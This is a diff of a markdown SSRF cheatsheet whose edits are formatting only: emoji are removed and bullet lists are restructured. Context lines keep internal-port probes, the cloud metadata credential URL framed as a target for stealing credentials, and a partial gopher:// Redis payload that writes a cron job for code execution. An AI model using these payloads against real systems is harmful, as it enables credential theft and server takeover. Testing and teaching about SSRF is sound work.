@@ -1,12 +1,12 @@
-# 🌩️ SSRF (Server-Side Request Forgery) Cheatsheet
+# SSRF (Server-Side Request Forgery) Cheatsheet
 
 > **⚠️ Ethical Warning:** Research and authorized testing only. Hitting internal metadata endpoints on production cloud environments is a critical severity action.
 
 ---
 
-## 🧠 1. The Types of SSRF
+## 1. The Types of SSRF
 
-*Understanding the "visibility" you have determines your attack path.*
+*Understanding the visibility you have determines your attack path.*
 
 ### A. Basic (In-Band) SSRF
 
@@ -23,28 +23,30 @@
 
 **What it means:** You send a request, but the server **does not return the response** body.
 
-* **Impact:** Lower immediate impact, but used to map internal networks or trigger remote code execution (RCE) on internal services (e.g., Redis, Memcached).
-* **Detection:**
+**Impact:**
+* Lower immediate impact, but used to map internal networks or trigger remote code execution (RCE) on internal services (e.g., Redis, Memcached).
+
+**Detection:**
 * **Time-Based:** `http://10.0.0.1:80` (Fast response) vs `http://10.0.0.1:81` (Timeout/Slow).
 * **Out-of-Band (OOB):** You force the server to DNS query or HTTP request a server you control (e.g., Burp Collaborator).
-
 
 
 ### C. Semi-Blind / Boolean SSRF
 
 **What it means:** You don't see the body, but you get a **different status code, error message, or response length**.
 
-* **Impact:** Port scanning and internal service enumeration.
-* **Detection:**
+**Impact:** 
+- Port scanning and internal service enumeration.
+
+**Detection:**
 * `http://localhost:22` -> Returns "Error: SSH-2.0..." (You know SSH is open).
 * `http://localhost:80` -> Returns "200 OK" (Empty body).
 * `http://localhost:9999` -> Returns "Connection Refused".
 
 
-
 ---
 
-## ☁️ 2. Cloud Metadata Targets (The "Holy Grail")
+## 2. Cloud Metadata Targets (The "Holy Grail")
 
 *If you have In-Band SSRF on a cloud server, these are your first targets to steal credentials.*
 
@@ -80,7 +82,7 @@ http://169.254.169.254/latest/meta-data/iam/security-credentials/
 
 ---
 
-## 🔗 3. Protocol Wrappers (Scheme Flooding)
+## 3. Protocol Wrappers (Scheme Flooding)
 
 *If `http://` is blocked, or you need to interact with non-web services.*
 
@@ -94,7 +96,7 @@ http://169.254.169.254/latest/meta-data/iam/security-credentials/
 
 ---
 
-## 🚧 4. Filter Bypasses
+## 4. Filter Bypasses
 
 *Developers often block "localhost" or "127.0.0.1". Here is how to slip past.*
 
@@ -131,7 +133,7 @@ http://169.254.169.254/latest/meta-data/iam/security-credentials/
 
 ---
 
-## 🎯 5. Blind SSRF -> RCE (The "Gopher" Method)
+## 5. Blind SSRF -> RCE (The "Gopher" Method)
 
 *If you have Blind SSRF, you can't read files. But you can WRITE commands to internal services.*
 
@@ -147,7 +149,7 @@ gopher://127.0.0.1:6379/_%0D%0ASET%20x%20%22%0A%2A%2F1%20%2A%20%2A%20%2A%20%2A%2
 
 ---
 
-## 🛠️ 6. Quick Reference: Common Internal Ports
+## 6. Quick Reference: Common Internal Ports
 
 *If scanning `localhost`, look for these.*
 
